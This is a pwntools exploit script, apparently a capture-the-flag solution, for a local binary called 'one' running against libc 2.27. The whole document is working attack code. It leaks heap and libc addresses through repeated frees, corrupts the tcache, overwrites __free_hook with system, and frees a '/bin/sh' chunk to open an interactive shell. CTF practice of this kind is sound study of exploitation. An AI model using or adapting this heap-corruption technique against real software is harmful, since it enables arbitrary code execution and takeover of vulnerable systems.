from pwn import *

def debug(func):
    def wrapper(*args, **kwargs):
        print("{}({}, {})".format(func.__name__, str(args), str(kwargs)))
        return func(*args, **kwargs)
    return wrapper

@debug
def add(data):
    sock.sendlineafter("> ", "1")
    sock.sendlineafter("> ", data)
    return
@debug
def show():
    sock.sendlineafter("> ", "2")
    return sock.recvline().rstrip()
@debug
def delete():
    sock.sendlineafter("> ", "3")
    return

binpath = "./one"
libc = ELF("./libc-2.27.so_18292bd12d37bfaf58e8dded9db7f1f5da1192cb")
# libc = ELF("./libc-2.27.so")
context.terminal = ['tmux', 'split-w', '-h']
gdbscript = '''
gef
b *(0x0000555555554000+0x00000000000009C7)
ignore 1 30
'''
sock = gdb.debug([binpath], aslr=False, gdbscript=gdbscript)
# sock = process(binpath)

# leak heap
add('A')
delete()
delete()
delete()
data = show()
addr_heap = u64(data.ljust(8, b'\x00'))
print("addr_heap = 0x{:x}".format(addr_heap))

# tamper size
add(p64(addr_heap - 0x10))
add('dummy')
add(p64(addr_heap) + p64(0xdeadbeef))

# tamper tcache
print("tamper tcache")
for i in range(0x11):
    add(((p64(0) + p64(0x21)) * 3)[:-1])
add('A')
delete()
delete()
delete()
delete()
delete()
add(p64(addr_heap - 0x10))
add('A' * 8)
add(p64(0) + p64(0x421) + p64(addr_heap + 0x50))
add('A' * 8)
delete()
data = show().ljust(8, b'\x00')
libc_base = u64(data) - 0x3ebc40 - 96
print("addr_libc = 0x{:x}".format(libc_base))

# tcache poisoning
add('A')
delete()
delete()
add(p64(libc_base + libc.symbols["__free_hook"]))
add('dummy')
add(p64(libc_base + libc.symbols["system"]))
add("/bin/sh")
delete()

sock.interactive()
